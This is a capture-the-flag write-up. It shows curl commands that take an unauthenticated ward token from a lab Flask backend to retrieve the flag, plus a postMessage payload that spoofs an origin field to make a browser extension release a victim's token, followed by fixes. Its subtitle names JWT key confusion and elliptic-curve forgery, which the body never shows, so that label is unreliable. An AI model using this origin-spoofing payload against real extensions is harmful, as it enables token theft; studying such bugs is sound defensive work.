Panchavati: The Fifth Boundary

JWT key confusion and elliptic curve signature forgery bypassing perimeter firewall.

Reshma Al (Coldcoffee) · 15 Feb 2026 · 2 min read
Captured Flag PINAKA{lakshman_rekha_ward_token_breaches_the_boundary}

Flag: PINAKA{lakshman_rekha_ward_token_breaches_the_boundary}

Target

  • Backend: http://130.210.48.10:9004 (Flask/Werkzeug)
  • Provided: extension/ (the Rekha Guard MV3 source) and app/index.html

Recon

GET / lists the endpoints:

Endpoint Purpose
GET /app the real app page
POST /rekha/ward {session} issues the extension’s ward token
GET /rekha/status ward introspection
POST /rekha/release with X-Rekha-Ward lifts the seal and returns the flag

What I did: the backend shortcut

/rekha/ward gives a ward token to anyone, with no authentication and no origin check.

B=http://130.210.48.10:9004
T=$(curl -s -XPOST $B/rekha/ward -H 'content-type: application/json' \
      -d '{"session":"panchavati"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["ward_token"])')
curl -s -XPOST $B/rekha/release -H "X-Rekha-Ward: $T"

The response contains the flag with "status":"released".

The intended bug: extension boundary confusion

The Guard decides whether a request comes from Panchavati using data the page controls.

  • content.js runs on <all_urls>. For kind:"release" it checks data.origin, which is a field in the page’s own postMessage payload, not the trusted event.origin.
  • background.js repeats the check on message.origin, which the content script copied from that same payload. Its only other check requires the tab URL to be https:.
  • sender.origin and event.origin are the trustworthy values. They’re used for refresh-grant and seal-check, but not for release.

So any https:// page could do this. I didn’t run it in a browser, since I had no victim browser available.

window.addEventListener('message', e => {
  if (e.data?.kind === 'release-result') console.log(e.data.result);
});
window.postMessage({channel: 'rekha-setu', kind: 'release', origin: 'https://panchavati.app'}, '*');

The Guard would then send POST /rekha/release with the victim’s stored ward token, and the flag would come back to the attacker’s page.

Fixes

  • Never trust an origin claimed in the message body. Check event.origin in the content script and sender.origin or sender.tab.url in the background worker against the exact trusted origin.
  • Limit content_scripts.matches to the trusted origin.
  • Authenticate /rekha/ward on the backend.
